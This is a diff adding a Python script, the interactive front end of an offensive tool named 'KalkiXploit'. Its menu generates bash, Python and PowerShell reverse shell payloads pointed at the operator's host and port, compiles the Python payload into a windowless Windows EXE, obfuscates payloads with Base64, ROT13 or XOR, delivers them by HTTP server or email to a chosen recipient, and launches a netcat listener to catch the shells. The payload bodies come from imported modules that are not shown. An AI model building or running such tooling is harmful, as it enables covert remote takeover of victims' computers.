@@ -1,0 +1,149 @@
+#!/usr/bin/env python3
+import os
+import sys
+from payloads.reverse_shells import bash_reverse_shell, python_reverse_shell, windows_powershell_reverse_shell
+from encoders.base64_encoder import base64_encode
+from encoders.rot13_encoder import rot13_encode
+from encoders.xor_encoder import xor_encode
+from delivery.http_delivery import start_http_server
+from delivery.smtp_mailer import send_email
+from listeners.netcat_listener import start_netcat_listener
+
+# Banner
+def banner():
+    print(r"""
+ __  __       _    _     _             
+|  \/  | __ _| | _(_)_ __   __ _ _ __  
+| |\/| |/ _` | |/ / | '_ \ / _` | '_ \ 
+| |  | | (_| |   <| | | | | (_| | |_) |
+|_|  |_|\__,_|_|\_\_|_| |_|\__,_| .__/ 
+                                |_|    
+    ████  █████  ██   ██ ██████  ██ ███    ██  ██████ 
+   ██     ██  ██ ██   ██ ██   ██ ██ ████   ██ ██     
+   ██     █████  ██   ██ ██████  ██ ██ ██  ██ ██  ███
+   ██     ██     ██   ██ ██   ██ ██ ██  ██ ██ ██   ██
+    ████  ██      █████  ██   ██ ██ ██   ████  ██████
+                  M A K B I N G   (KalkiXploit)
+""")
+
+# Menu
+def menu():
+    print("\nChoose an option:")
+    print("[1] Generate Payload")
+    print("[2] Encode Payload")
+    print("[3] Deliver Payload")
+    print("[4] Start Listener")
+    print("[5] Help")
+    print("[6] Clear Screen")
+    print("[0] Exit")
+
+def main():
+    banner()
+    while True:
+        menu()
+        choice = input("kalkixploit> ").strip()
+        
+        if choice == "1":  # Generate payload
+            lhost = input("Enter LHOST (your IP): ")
+            lport = input("Enter LPORT (your Port): ")
+            print("Payload Types:")
+            print("[1] Bash Reverse Shell")
+            print("[2] Python Reverse Shell")
+            print("[3] PowerShell Reverse Shell")
+            pchoice = input("Choose payload type: ")
+
+            payload_code = ""
+            if pchoice == "1":
+                payload_code = bash_reverse_shell(lhost, lport)
+                fname = "payload.sh"
+            elif pchoice == "2":
+                payload_code = python_reverse_shell(lhost, lport)
+                fname = "payload.py"
+            elif pchoice == "3":
+                payload_code = windows_powershell_reverse_shell(lhost, lport)
+                fname = "payload.ps1"
+            else:
+                print("[!] Invalid payload choice.")
+                continue
+
+            with open(fname, "w") as f:
+                f.write(payload_code)
+            print(f"[+] Payload saved as {fname}")
+
+            # Offer EXE build if Python payload
+            if pchoice == "2":
+                build_exe = input("Do you want to compile this payload into an EXE for Windows? (y/n): ").strip().lower()
+                if build_exe == "y":
+                    print("[*] Building Windows EXE using PyInstaller...")
+                    os.system(f"pyinstaller --onefile --noconsole {fname}")
+                    print("[+] EXE build complete! Check the 'dist' folder for 'payload.exe'")
+
+        elif choice == "2":  # Encode payload
+            fname = input("Enter filename of payload to encode: ")
+            if not os.path.exists(fname):
+                print("[!] File not found.")
+                continue
+            with open(fname, "r") as f:
+                content = f.read()
+            print("Encoder Types:")
+            print("[1] Base64")
+            print("[2] ROT13")
+            print("[3] XOR")
+            ech = input("Choose encoder: ")
+            encoded = ""
+            if ech == "1":
+                encoded = base64_encode(content)
+            elif ech == "2":
+                encoded = rot13_encode(content)
+            elif ech == "3":
+                key = input("Enter XOR key (string): ")
+                encoded = xor_encode(content, key)
+            else:
+                print("[!] Invalid encoder choice.")
+                continue
+            with open(f"{fname}.enc", "w") as f:
+                f.write(encoded)
+            print(f"[+] Encoded payload saved as {fname}.enc")
+
+        elif choice == "3":  # Deliver
+            print("Delivery Methods:")
+            print("[1] HTTP Server")
+            print("[2] SMTP Mailer")
+            dchoice = input("Choose delivery method: ")
+            if dchoice == "1":
+                port = input("Enter port for HTTP server (default 8080): ") or "8080"
+                start_http_server(port)
+            elif dchoice == "2":
+                sender = input("Enter sender email: ")
+                password = input("Enter sender email password: ")
+                receiver = input("Enter receiver email: ")
+                file = input("Enter filename of payload to send: ")
+                send_email(sender, password, receiver, file)
+            else:
+                print("[!] Invalid delivery choice.")
+
+        elif choice == "4":  # Listener
+            port = input("Enter LPORT to listen on: ")
+            start_netcat_listener(port)
+
+        elif choice == "5":  # Help
+            print("""
+[1] Generate Payload - create a reverse shell payload (bash, python, powershell)
+[2] Encode Payload   - encode payload with Base64, ROT13, XOR
+[3] Deliver Payload  - serve over HTTP or send via email
+[4] Start Listener   - launch netcat listener on chosen port
+[0] Exit
+""")
+
+        elif choice == "6":  # Clear
+            os.system("clear")
+
+        elif choice == "0":  # Exit
+            print("Goodbye")
+            sys.exit(0)
+
+        else:
+            print("[!] Invalid choice. Try again.")
+
+if __name__ == "__main__":
+    main()
